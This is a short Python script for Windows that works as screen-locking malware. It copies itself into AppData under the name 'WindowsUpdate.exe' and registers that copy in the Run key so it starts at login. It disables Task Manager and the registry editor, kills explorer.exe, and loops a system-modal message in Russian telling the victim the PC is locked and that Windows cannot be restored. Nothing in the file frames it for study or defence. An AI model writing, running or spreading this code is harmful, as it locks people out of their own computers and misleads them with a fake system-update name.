import os
import sys
import ctypes
import shutil

def add_to_startup():
    
    try:
        
        appdata = os.getenv('APPDATA')
        dest = os.path.join(appdata, 'WindowsUpdate.exe')
        
        
        shutil.copy(sys.executable, dest)
        
        #
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
    except:
        pass

def block_system():
    
    try :
        #
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        
        os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
        
        
        os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f')
        
        
        os.system('taskkill /f /im explorer.exe')
        
        
        while True:
            ctypes.windll.user32.MessageBoxW(0, 
                "ТВОЙ ПК БЫЛ ЗАБЛОКИРОВАН\n\n"
                "python user был сдесю"
                "Перезагрузка не поможет.\n"
                "Windows восстановлению не подлежит.\n\n"
                ""
                "",
                "", 
                0x10 | 0x1000 | 0x10000)  
    except:
        pass

if __name__ == "__main__":
    add_to_startup()
    block_system()
